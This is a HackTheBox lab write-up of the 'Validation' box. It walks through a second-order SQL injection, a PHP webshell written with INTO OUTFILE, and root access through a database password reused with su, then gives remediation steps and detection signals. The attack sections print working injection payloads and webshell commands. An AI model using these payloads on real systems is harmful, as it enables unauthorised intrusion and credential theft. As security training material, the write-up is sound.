---
layout: default
title: "HackTheBox - Validation"
---

# HackTheBox - Validation

**OS:** Linux (Debian, containerised)

Validation is an Easy Linux web box whose name describes the vulnerability: the country
field of a user-registration form is never validated server-side. Although the browser
enforces a `<select>` dropdown, sending the POST directly lets an attacker inject
arbitrary SQL. A UNION-based injection writes a PHP webshell to the document root and
yields code execution as `www-data`. Reading the PHP config file reveals the database
credential, which is reused verbatim as the root OS password. A single `su -c` call
through the webshell gives a root shell and both flags.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` |
| Initial Access | Second-order SQLi -> MySQL INTO OUTFILE webshell -> RCE as www-data |
| Privilege Escalation | DB plaintext credential reused as root OS password |
| Final Access | `root` |

---

## Recon

### Port Scan

p0rtix ran a top-ports TCP sweep followed by a full -p- background sweep. Four TCP
ports were open; no UDP ports of interest.

| Port | Proto | Service | Notes |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 |
| 80 | TCP | HTTP | Apache 2.4.48 (Debian), PHP/7.4.23 |
| 4566 | TCP | HTTP | nginx, 403 Forbidden (LocalStack S3) |
| 8080 | TCP | HTTP | nginx, 502 Bad Gateway |

```
$ nmap -sV -p 22,80,4566,8080 <target-ip>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
4566/tcp open  http    nginx
8080/tcp open  http    nginx
```

Port 4566 is LocalStack (an AWS-emulation stack); it returned 403 on all unauthenticated
probes and was not the intended attack surface. Port 8080 was a dead 502. The target
was port 80.

### Web Application -- Port 80

A directory bust of port 80 found only static asset folders (`/css`, `/js`) and
`index.php`. The main page presented a "Join the UHC - September Qualifiers"
registration form with two fields: a free-text `username` and a country `<select>`
dropdown.

```
$ ffuf -u http://<target-ip>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404

css          [Status: 301]
index.php    [Status: 200]
js           [Status: 301]
server-status [Status: 403]
```

Submitting the form set a session cookie and redirected to `/account.php`:

```
$ curl -v -X POST http://<target-ip>/ -d "username=testuser&country=Brazil"
< HTTP/1.1 302 Found
< Set-Cookie: user=5d9c68c6c50ed3d02a2fcf54f63993b6
< Location: /account.php

$ curl http://<target-ip>/account.php -b "user=5d9c68c6c50ed3d02a2fcf54f63993b6"
<h1 class="text-white">Welcome testuser</h1>
<h3 class="text-white">Other Players In Brazil</h3>
<li class='text-white'>testuser</li>
```

The country string is stored in the database and then reflected into the page heading
and a follow-up SQL query. The `<select>` enforces a valid country in the browser; the
server never checks.

---

## Initial Access

### SQLi Identification

Sending a single quote in the country POST parameter broke the second database query
and produced a PHP fatal error with a stack trace:

```
$ curl -X POST http://<target-ip>/ -d "username=sqlitest&country=Brazil'"
<h3 class="text-white">Other Players In Brazil'</h3>
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool
in /var/www/html/account.php:33
```

> **Why this works:** `account.php` runs two queries. The first (parameterised) looks up
> the stored country by session hash. The second embeds that country value directly into
> a string-concatenated SQL statement -- `WHERE country = '" . $row['country'] . "'"` --
> making it injectable. The `<select>` in the registration form is pure client-side; any
> country string can be POSTed directly.

### Column Count

`ORDER BY` enumeration showed exactly one column in the output set:

```
$ curl -X POST http://<target-ip>/ -d "username=t&country=Brazil' ORDER BY 1-- -"
# -> valid (no error)

$ curl -X POST http://<target-ip>/ -d "username=t&country=Brazil' ORDER BY 2-- -"
# -> Fatal error (column 2 does not exist)
```

### UNION Injection -- Data Extraction

With one column confirmed, a `UNION SELECT` injected arbitrary data into the player list:

```
$ curl -X POST http://<target-ip>/ -d "username=u&country=Brazil' UNION SELECT @@version-- -" \
  -L -c /tmp/c.txt
$ curl http://<target-ip>/account.php -b /tmp/c.txt
<li class='text-white'>testuser</li>
<li class='text-white'>10.5.11-MariaDB-1</li>
```

Database: **MariaDB 10.5.11**.

### Webshell via INTO OUTFILE

The MariaDB process has the `FILE` privilege and `secure_file_priv` is unset. The web
root (`/var/www/html/`) is writable by the `mysql` OS user. A single `UNION SELECT ...
INTO OUTFILE` wrote a PHP one-liner:

```
$ curl -X POST http://<target-ip>/ \
  -d "username=s&country=Brazil' UNION SELECT '<?php system(\$_GET[\"cmd\"]); ?>' \
  INTO OUTFILE '/var/www/html/shell.php'-- -"
```

The query throws a PHP error (INTO OUTFILE returns no result set, so `fetch_assoc`
fails), but the file is written regardless. Verification:

```
$ curl "http://<target-ip>/shell.php?cmd=id"
testuser
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why this works:** MariaDB's `INTO OUTFILE` writes the query result as a flat file
> using the database process's OS privileges. When `secure_file_priv` is empty (the
> default in many distros) and the document root is world-writable or owned by `mysql`,
> a `FILE`-privileged user can plant any file the web server will then execute.
> `shell.php` is owned by `mysql` but served by Apache, giving immediate RCE.

### User Flag

```
$ curl "http://<target-ip>/shell.php?cmd=cat+/home/htb/user.txt"
<user-flag-redacted>
```

---

## Post-Exploitation Enumeration

A standard privesc enumeration pass via the webshell found:

- No sudo binary (`sudo: not found`).
- Standard SUID set -- nothing unusual (passwd, newgrp, gpasswd, chfn, chsh, su, mount, umount).
- No crontab, no writable `/etc/passwd`.
- `/dev/tcp` absent (containerised environment); `nc` and `python3` absent; `perl` present but outbound TCP was blocked -- reverse shells were not achievable.

Reading the web application's config file was the productive path:

```
$ curl "http://<target-ip>/shell.php" --data-urlencode "cmd=cat /var/www/html/config.php"
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";
  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

---

## Privilege Escalation

The plaintext database password `uhc-9qual-global-pw` was reused as the root OS
password. Because `su` is available and accepts a password piped via stdin from a
non-TTY context, a single command through the webshell gave a root shell:

```
$ curl "http://<target-ip>/shell.php" \
  --data-urlencode "cmd=echo 'uhc-9qual-global-pw' | su -c 'id && cat /root/root.txt' root 2>&1"
Password: uid=0(root) gid=0(root) groups=0(root)
<root-flag-redacted>
```

> **Why this works:** `su` on Linux reads the password from the controlling terminal
> when one is present, but falls back to stdin when none exists (as in a non-interactive
> web process). Piping the password with `echo '...' | su -c '...' root` bypasses the
> TTY requirement and authenticates as root without an interactive shell.

---

## Post-Exploitation: C2 (Sliver)

Sliver C2 was attempted. The target is containerised and does not expose `/dev/tcp`;
`nc` and `python3` are absent; a perl reverse shell connected but could not reach the
attack box. No egress path was viable for a beacon. Sliver demo skipped with this
one-line reason recorded in box notes.

---

## Root Cause

Two separate weaknesses combined to give full compromise:

1. **Second-order SQL injection.** The registration endpoint stores user-supplied
   country values and re-embeds them unsanitised into a subsequent SQL query. Any
   country value can be injected, bypassing the browser-enforced dropdown entirely.

2. **Credential reuse.** The database password stored in `config.php` was also set
   as the root OS account password. A single credential served as the lateral pivot
   from the web application to the operating system.

---

## Impact

- Unauthenticated RCE on the web server as `www-data` via a planted webshell.
- Full OS compromise (root) through credential reuse.
- The database password, all stored usernames, and the entire filesystem were accessible
  to an anonymous internet attacker.

---

## Remediation

Priority order -- the first two items break the attack path; the rest are hardening.

1. **Parameterise the second query in `account.php`.** Replace the string-concatenated
   `WHERE country = '".$row['country']."'` with a prepared statement (`$stmt->bind_param`),
   identical to how the first query is already written. This eliminates the SQLi root cause.

2. **Set `secure_file_priv` to an empty or restricted path in `my.cnf`.** Set
   `secure_file_priv = /var/lib/mysql-files` (or a similarly isolated directory) so
   that `INTO OUTFILE` and `LOAD_FILE` cannot read or write to the web root.

3. **Use unique, randomly generated passwords for each service.** The database credential
   should never be the same as any OS account password. Rotate the `uhc` DB password
   and generate a separate strong root OS password.

4. **Restrict `FILE` privilege on the database user.** The `uhc` database user does not
   need `FILE` privilege to serve the application. Revoke it:
   `REVOKE FILE ON *.* FROM 'uhc'@'localhost';`

5. **Make `/var/www/html` non-writable by the `mysql` OS user.** The document root
   should not be writable by any user other than the deploying account. `chown` the
   directory to `root:www-data` with permissions `755`.

### Validation

After applying the fixes, confirm:

- Submitting `Brazil' UNION SELECT 1-- -` as the country returns no injected row and
  no SQL error.
- `SHOW GLOBAL VARIABLES LIKE 'secure_file_priv'` returns a non-empty restricted path.
- `SHOW GRANTS FOR 'uhc'@'localhost'` does not include `FILE`.
- `ls -la /var/www/html` shows the directory owned by root and not writable by `mysql`.

---

## Detection Opportunities

| Signal | Event / Source |
|---|---|
| SQL syntax in POST body | Apache access log -- `country=Brazil'+UNION+SELECT` in the POST data |
| `INTO OUTFILE` to web root | MariaDB general query log -- queries containing `INTO OUTFILE '/var/www'` |
| Unexpected file creation in document root | inotifywait / auditd -- `CREATE` event on `/var/www/html/*.php` by the `mysql` user |
| Web shell execution | Apache access log -- repeated `?cmd=` GET parameters; `shell.php` returning 200 |
| `su` called from `www-data` | auditd rule on `execve` for `su` with UID 33 |

---

## Lessons Learned

- **Stored SQLi can be harder to spot than reflected.** The vulnerability is not in the
  form submission itself (that first INSERT uses string concatenation too, but the value
  is not reflected immediately). It surfaces in the *second* query that re-uses the stored
  value. Always trace every stored field back to every query that consumes it.

- **`SELECT` protections do not help if `INTO OUTFILE` is available.** Even if you
  sanitise the display query, a `FILE`-privileged user can plant files at any writable
  path the DB process can reach. Treat `FILE` as a dangerous privilege and restrict it
  alongside `secure_file_priv`.

- **Password reuse is the easiest lateral move.** The SQLi was needed for RCE; the
  privilege escalation required zero exploitation -- just `su` with a password found in
  plain text one directory above the webroot.

- **Containerisation does not eliminate privesc.** The lack of `/dev/tcp`, `nc`, and
  `python3` prevented a traditional reverse shell, but the webshell-plus-`su` path still
  gave root without ever leaving port 80.

---

## Cleanup

```
[ ] shell.php dropped on target (written by MySQL INTO OUTFILE) -- note: target is an HTB
    lab box and was terminated; in a real engagement, remove with:
    curl "http://<target-ip>/shell.php" --data-urlencode "cmd=rm /var/www/html/shell.php"
[ ] No AD objects or ACLs modified
[ ] No persistent mechanisms left beyond the webshell (all access was via single HTTP requests)
[ ] HTB: flags submitted, box terminated (htb stop)
[ ] Loot (config.php plaintext creds, flags) stored in private notes only; not committed
[ ] Sliver C2 skipped (no egress path) -- no beacon or listener to tear down
```
